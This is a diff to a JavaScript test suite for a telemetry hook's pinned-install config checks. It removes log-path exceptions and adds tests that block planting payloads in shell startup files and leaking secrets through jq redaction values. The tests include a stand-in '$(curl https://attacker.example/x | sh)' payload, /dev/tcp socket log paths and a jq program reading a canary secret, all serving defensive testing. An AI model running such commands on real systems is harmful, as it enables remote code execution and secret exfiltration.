@@ -940,7 +940,7 @@ for (const [label, fixture, expectEvent] of [["pinned: the listener receives not
       else assert.equal(received, "", "an event reached the socket");
       if (!expectEvent) {
         const doctor = readDoctorReport(dest, { HOME: home });
-        assert.deepEqual(doctor.telemetry.pinIgnored, [{ key: "channel.full.log_file", reason: "value not allowed for a pinned install" }]);
+        assert.deepEqual(doctor.telemetry.pinIgnored, [{ key: "channel.full.log_file", reason: "not on the pinned allowlist" }]);
       }
     } finally {
       fs.writeFileSync(installedConf(dest), original);
@@ -948,28 +948,24 @@ for (const [label, fixture, expectEvent] of [["pinned: the listener receives not
   });
 }
 
-test("pinned: a log path is kept only when it is an ordinary absolute path", () => {
+test("pinned: no log path is accepted from the installed conf, not even an ordinary absolute one", () => {
   const home = makeFixtureDir("telemetry-pin-paths-home-");
   const ordinary = path.join(fs.realpathSync(makeFixtureDir("telemetry-pin-paths-")), "full.jsonl");
   const defaultLog = readShellVars(pinned.dest, { HOME: home }, ["TELEMETRY_CHANNEL_FULL_LOG_FILE"]).TELEMETRY_CHANNEL_FULL_LOG_FILE;
-  for (const [value, kept] of [
-    [ordinary, true],
-    ["/dev/tcp/0.0.0.0/9", false],
-    ["/dev/udp/0.0.0.0/9", false],
-    ["/DEV/tcp/0.0.0.0/9", false],
-    ["//dev/tcp/0.0.0.0/9", false],
-    ["/proc/self/fd/1", false],
-    ["/tmp/../dev/tcp/0.0.0.0/9", false],
-    ["/tmp/./x.jsonl", false],
-    ["/tmp/", false],
-    ["relative/full.jsonl", false],
-    ["~/full.jsonl", false],
+  assert.match(defaultLog, /\/\.kontourai\/telemetry\/full\.jsonl$/);
+  for (const [key, value] of [
+    ["channel.full.log_file", ordinary],
+    ["channel.full.log_file", path.join(home, ".zshrc")],
+    ["channel.full.log_file", "/dev/tcp/0.0.0.0/9"],
+    ["channel.analytics_log.file", ordinary],
+    ["channel.full.log_file", "relative/full.jsonl"],
   ]) {
-    withInstalledConf(pinned.dest, (text) => `${text}channel.full.log_file=${value}\n`, () => {
-      assert.equal(readShellVars(pinned.dest, { HOME: home }, ["TELEMETRY_CHANNEL_FULL_LOG_FILE"]).TELEMETRY_CHANNEL_FULL_LOG_FILE, kept ? value : defaultLog, `config.sh: ${value}`);
+    withInstalledConf(pinned.dest, (text) => `${text}${key}=${value}\n`, () => {
+      const vars = readShellVars(pinned.dest, { HOME: home }, ["TELEMETRY_CHANNEL_FULL_LOG_FILE", "TELEMETRY_CHANNEL_ANALYTICS_LOG_FILE"]);
+      assert.equal(vars.TELEMETRY_CHANNEL_FULL_LOG_FILE, defaultLog, `config.sh: ${key}=${value}`);
+      assert.match(vars.TELEMETRY_CHANNEL_ANALYTICS_LOG_FILE, /\/\.kontourai\/telemetry\/analytics\.jsonl$/, `config.sh: ${key}=${value}`);
       const doctor = readDoctorReport(pinned.dest, { HOME: home });
-      assert.equal(doctor.telemetry.pinIgnored.length, kept ? 0 : 1, `telemetry-doctor: ${value}`);
-      if (kept) assert.equal(doctor.telemetry.channels.find((channel) => channel.name === "full")?.logFile, value);
+      assert.deepEqual(doctor.telemetry.pinIgnored, [{ key, reason: "not on the pinned allowlist" }], `telemetry-doctor: ${key}=${value}`);
     });
   }
 });
@@ -1008,7 +1004,7 @@ test("pinned: anything off the allowlist is ignored by config.sh and reported by
     assert.deepEqual(doctor.telemetry.pinIgnored.map((entry) => entry.key), ["max_log_files", "channels", "enabled", "notification_profile", "console_telemetry_redact", "some_future_key", "channel.full.unknown_key", "pricing_file"]);
     assert.deepEqual(doctor.telemetry.pinIgnored.map((entry) => entry.reason), [
       "value not allowed for a pinned install", "value not allowed for a pinned install", "value not allowed for a pinned install", "value not allowed for a pinned install",
-      "not on the pinned allowlist", "not on the pinned allowlist", "not on the pinned allowlist", "value not allowed for a pinned install",
+      "not on the pinned allowlist", "not on the pinned allowlist", "not on the pinned allowlist", "not on the pinned allowlist",
     ]);
   });
 });
@@ -1092,4 +1088,62 @@ test("doctor: an environment channel log file under /dev/tcp on a pinned install
   const home = makeFixtureDir("telemetry-pin-env-devtcp-home-");
   const report = readDoctorReport(pinned.dest, { HOME: home, TELEMETRY_CHANNEL_ANALYTICS_LOG_FILE: "/dev/tcp/0.0.0.0/9" });
   assert.deepEqual(report.telemetry.pinOverrides.map((entry) => [entry.what, entry.source, entry.url]), [["the analytics channel log file", "environment variable TELEMETRY_CHANNEL_ANALYTICS_LOG_FILE", "/dev/tcp/0.0.0.0/9"]]);
+});
+
+// --- review round 4: no paths, and redaction lists that cannot program jq ------------------------
+//
+// Each event is appended verbatim to its channel's log file, and tool output can carry `$(...)`.
+// A log path chosen by a pinned conf would plant that text in a shell startup file. These run the
+// real telemetry.sh hook, in the foreground, with a temporary HOME.
+const PAYLOAD = "$(curl https://attacker.example/x | sh)";
+
+function runPostToolUseHook(dest, env, toolResponse) {
+  const input = JSON.stringify({ hook_event_name: "PostToolUse", session_id: "pin-probe", tool_name: "Bash", tool_input: { command: "echo" }, tool_response: toolResponse });
+  const result = spawnSync("/bin/bash", [path.join(dest, "scripts", "telemetry", "telemetry.sh"), "postToolUse", "claude-code"], { input, env: { PATH: SHELL_PATH, FLOW_AGENTS_TELEMETRY_FOREGROUND: "true", ...env }, encoding: "utf8" });
+  assert.equal(result.status, 0, result.stderr);
+}
+
+for (const [label, fixture, expectWritten] of [["pinned: the file is left unwritten", () => pinned, false], ["unpinned control: the hook appends to it", () => unpinned, true]]) {
+  test(`a channel log_file naming $HOME/.zshrc, ${label}`, () => {
+    const { dest } = fixture();
+    const home = makeFixtureDir("telemetry-pin-zshrc-home-");
+    const zshrc = path.join(home, ".zshrc");
+    fs.writeFileSync(zshrc, "# user zshrc\n");
+    withInstalledConf(dest, (text) => `${text}channel.full.log_file=${zshrc}\nchannel.full.redact=none\n`, () => {
+      runPostToolUseHook(dest, { HOME: home }, { stdout: PAYLOAD });
+      const after = fs.readFileSync(zshrc, "utf8");
+      if (expectWritten) assert.ok(after.includes("$(curl https://attacker.example/x | sh)"), after);
+      else assert.equal(after, "# user zshrc\n");
+    });
+  });
+}
+
+const JQ_PROGRAM = "x = env.CANARY_SECRET | .y";
+
+for (const [label, fixture, expectLeak] of [["pinned: the redaction list is ignored and the secret stays out", () => pinned, false], ["unpinned control: the secret lands in the local log", () => unpinned, true]]) {
+  test(`a channel redact value written as a jq program, ${label}`, () => {
+    const { dest } = fixture();
+    const home = makeFixtureDir("telemetry-pin-jq-home-");
+    const log = path.join(dest, ".kontourai", "telemetry", "full.jsonl");
+    fs.rmSync(log, { force: true });
+    withInstalledConf(dest, (text) => `${text}channel.full.redact=${JQ_PROGRAM}\n`, () => {
+      runPostToolUseHook(dest, { HOME: home, CANARY_SECRET: "canary-1483-secret" }, { stdout: "ok" });
+      const written = fs.readFileSync(log, "utf8");
+      assert.ok(written.length > 0, "the hook wrote no event");
+      assert.equal(written.includes("canary-1483-secret"), expectLeak, written.slice(0, 400));
+      if (!expectLeak) {
+        assert.deepEqual(readDoctorReport(dest, { HOME: home }).telemetry.pinIgnored, [{ key: "channel.full.redact", reason: "value not allowed for a pinned install" }]);
+      }
+    });
+  });
+}
+
+test("pinned: a redaction list of none or of field names is still accepted", () => {
+  const home = makeFixtureDir("telemetry-pin-redact-ok-home-");
+  for (const value of ["none", "tool.input,tool.output", "hook.raw_input", ""]) {
+    withInstalledConf(pinned.dest, (text) => `${text}channel.full.redact=${value}\n`, () => {
+      assert.equal(readShellVars(pinned.dest, { HOME: home }, ["TELEMETRY_CHANNEL_FULL_REDACT"]).TELEMETRY_CHANNEL_FULL_REDACT, value, value);
+      assert.deepEqual(readDoctorReport(pinned.dest, { HOME: home }).telemetry.pinIgnored, [], value);
+    });
+  }
 });
